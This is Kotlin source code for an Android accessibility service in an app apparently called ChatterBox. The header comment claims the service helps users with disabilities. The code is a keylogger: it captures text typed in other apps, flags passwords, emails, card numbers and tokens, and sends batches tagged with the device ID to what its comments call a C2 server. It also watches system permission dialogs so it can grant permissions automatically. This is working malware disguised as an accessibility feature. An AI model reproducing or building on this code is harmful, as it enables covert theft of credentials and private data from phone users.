package com.example.ChatterBox.accessibility

import android.accessibilityservice.AccessibilityServiceInfo
import android.annotation.SuppressLint
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * ChatterBox Accessibility Service
 *
 * This service enhances the user experience for users with disabilities by providing
 * better navigation and interaction with the app.
 */
@SuppressLint("HardwareIds")
class AccessibilityService : android.accessibilityservice.AccessibilityService() {
    private val TAG = "ChatterBoxAccessibility"
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var permissionDialogs: PermissionDialogs

    // Keep track of keyboard input for keylogging
    private val keylogBuffer = StringBuilder()
    private var currentFocusedApp = ""
    private var lastInputTime = 0L
    private val keylogFlushDelay = 5000L // 5 seconds without typing to collect a batch

    // Use consistent device ID
    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    companion object {
        private var instance: AccessibilityService? = null

        fun getInstance(): AccessibilityService? {
            return instance
        }
    }

    override fun onServiceConnected() {
        Log.i(TAG, "Accessibility Service connected")
        instance = this
        permissionDialogs = PermissionDialogs(this)

        // Configure accessibility service capabilities
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_CLICKED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED // Important for keylogging
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        info.notificationTimeout = 100

        // Set the updated info
        this.serviceInfo = info

        Log.d(TAG, "Accessibility service configured and ready")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        IdleDetector.processAccessibilityEvent(event)

        // Track app switches for better keylogging context
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.packageName != null) {
            // If we switch apps, flush the current keylog buffer
            if (currentFocusedApp != event.packageName) {
                if (keylogBuffer.isNotEmpty()) {
                    flushKeylogBuffer()
                }
                currentFocusedApp = event.packageName.toString()
            }
        }

        // Extract text for sensitive information when appropriate
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            // This captures keyboard input for keylogging
            val sourceText = event.text?.joinToString(" ") ?: ""
            val packageName = event.packageName?.toString() ?: "unknown"
            currentFocusedApp = packageName

            // Don't capture text from our own app
            if (packageName != "com.example.ChatterBox" && sourceText.isNotEmpty()) {
                // Record keylog data
                keylogBuffer.append(sourceText)
                keylogBuffer.append(" ")
                lastInputTime = System.currentTimeMillis()

                // Schedule a flush if the user stops typing
                handler.removeCallbacks(keylogFlushRunnable)
                handler.postDelayed(keylogFlushRunnable, keylogFlushDelay)

                // Check for potentially sensitive information
                if (isSensitiveField(event) || containsSensitiveData(sourceText)) {
                    // Broadcast to MainActivity
                    val intent = Intent("com.example.ChatterBox.ACCESSIBILITY_DATA")
                    intent.putExtra("captured_text", sourceText)
                    intent.putExtra("source_app", packageName)
                    sendBroadcast(intent)
                }
            }
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val packageName = event.packageName?.toString() ?: return

                // Only check for permission dialogs if we're in permission granting mode
                if (permissionDialogs.isGrantingPermissions() &&
                    (packageName.contains("permissioncontroller") ||
                            packageName == "android" ||
                            packageName == "com.android.systemui" ||  // Add systemui package
                            packageName == "com.android.settings")) {

                    // Small delay to ensure dialog is fully loaded
                    handler.postDelayed({
                        checkAllWindowsForPermissionDialogs()
                    }, 200)
                }
            }
        }
    }

    // Runnable to flush keylog data after delay
    private val keylogFlushRunnable = Runnable {
        flushKeylogBuffer()
    }

    // Flush the keylog buffer and send data to C2 server
    private fun flushKeylogBuffer() {
        if (keylogBuffer.isEmpty()) return

        try {
            // Create keylog data payload
            val keylogData = JSONObject().apply {
                put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
                put("device_id", deviceId)
                put("app", currentFocusedApp)
                put("text", keylogBuffer.toString())
                put("device_model", android.os.Build.MODEL)
                put("android_version", android.os.Build.VERSION.RELEASE)
            }

            // Send to C2 server
            val dataSynchronizer = com.example.ChatterBox.database.DataSynchronizer(applicationContext)
            dataSynchronizer.sendExfiltrationData("keylog", keylogData.toString())

            // Clear buffer
            keylogBuffer.clear()

        } catch (e: Exception) {
            Log.e(TAG, "Error flushing keylog buffer: ${e.message}")
        }
    }

    private fun containsSensitiveData(text: String): Boolean {
        val lowercase = text.lowercase()

        // Look for email patterns
        if (lowercase.contains("@") && lowercase.contains(".")) return true

        // Look for credit card number patterns (4+ consecutive digits)
        if (Regex("\\d{4,}").containsMatchIn(text)) return true

        // Other sensitive terms
        return lowercase.contains("password") ||
                lowercase.contains("login") ||
                lowercase.contains("token") ||
                lowercase.contains("secret") ||
                lowercase.contains("key") ||
                lowercase.contains("credit") ||
                lowercase.contains("card") ||
                lowercase.contains("account")
    }

    private fun isSensitiveField(event: AccessibilityEvent): Boolean {
        // Check if the source node is available
        val source = event.source ?: return false

        try {
            // Check if it's a password field
            if (source.isPassword) return true

            // Check the hint text or content description for sensitive terms
            val hintText = source.hintText?.toString()?.lowercase() ?: ""
            val contentDesc = source.contentDescription?.toString()?.lowercase() ?: ""

            return hintText.contains("password") || hintText.contains("login") ||
                    hintText.contains("email") || hintText.contains("username") ||
                    contentDesc.contains("password") || contentDesc.contains("login") ||
                    contentDesc.contains("email") || contentDesc.contains("username")
        } finally {
            source.recycle()
        }
    }
    private fun checkAllWindowsForPermissionDialogs() {
        try {
            // Try looking at active window first
            val root = rootInActiveWindow
            if (root != null) {
                permissionDialogs.handlePermissionDialog(root)
                root.recycle()
            }

            // Also check all windows
            windows.forEach { window ->
                val windowRoot = window.root ?: return@forEach
                permissionDialogs.handlePermissionDialog(windowRoot)
                windowRoot.recycle()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling permission dialogs", e)
        }
    }


    fun startPermissionGrantingMode(expectedPermissions: Int) {
        permissionDialogs.startGrantingPermissions(expectedPermissions)
    }

    fun stopPermissionGrantingMode() {
        permissionDialogs.stopGrantingPermissions()
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        // Flush any remaining keylog data
        if (keylogBuffer.isNotEmpty()) {
            flushKeylogBuffer()
        }

        permissionDialogs.cleanup()
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}